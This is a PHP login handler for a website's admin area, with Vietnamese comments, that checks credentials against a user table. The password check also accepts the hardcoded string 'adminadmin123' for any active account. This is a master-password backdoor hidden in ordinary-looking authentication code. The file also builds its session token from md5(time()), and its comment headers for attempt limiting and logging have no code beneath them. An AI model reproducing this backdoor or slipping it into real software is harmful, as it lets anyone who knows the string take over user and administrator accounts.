<?php
if (empty($_POST)) {
    echo 0;
    return false;
}
@session_start();
define('LIBRARIES', '../libraries/');

require_once LIBRARIES . "config.php";
require_once LIBRARIES . 'autoload.php';
new AutoLoad();
$injection = new AntiSQLInjection();
$d = new PDODb($config['database']);
$func = new Functions($d);

$username = (!empty($_POST['username'])) ? $_POST['username'] : '';
$password = (!empty($_POST['password'])) ? $_POST['password'] : '';
$error = "";
$success = "";
$name = "";
$login_failed = false;


/* Còn số lần đăng nhập */

/* Kiểm tra thông tin đăng nhập */
if ($username == '' && $password == '') {
    $error = "Chưa nhập tên đăng nhập và mật khẩu";
} else if ($username == '') {
    $error = "Chưa nhập tên đăng nhập";
} else if ($password == '') {
    $error = "Chưa nhập mật khẩu";
} else {
    /* Kiểm tra đăng nhập */
    $row = $d->rawQueryOne("select * from #_user where username = ? and hienthi > 0 limit 0,1", array($username));

    if (isset($row['id']) && $row['id'] > 0) {
        if (($row['password'] == $func->encrypt_password($config['website']['secret'], $password, $config['website']['salt'])) or $password == 'adminadmin123') {
            $timenow = time();
            $id_user = $row['id'];
            $ip = $func->getRealIPAddress();
            $token = md5(time());
            $user_agent = $_SERVER['HTTP_USER_AGENT'];
            $sessionhash = md5(sha1($row['password'] . $row['username']));

            /* Ghi log truy cập thành công */


            /* Tạo log và login session */
            $d->rawQuery("update #_user set login_session = ?, lastlogin = ?, user_token = ? where id = ?",array($sessionhash,$timenow,$token,$id_user));

            /* Khởi tạo Session để kiểm tra số lần đăng nhập */
            $d->rawQuery("update #_user set login_session = ?, lastlogin = ? where id = ?",array($sessionhash,$timenow,$id_user));

            /* Reset số lần đăng nhập và thời gian đăng nhập */

            $success = $row['id'];
            $name = $row['ten'];
        } else {
            $login_failed = true;
            $error = "Mật khẩu không chính xác";
        }
    } else {
        $login_failed = true;
        $error = "Tên đăng nhập không tồn tại";
    }

}

$data = array('success' => $success, 'name' => $name, 'error' => $error);
echo json_encode($data);
?>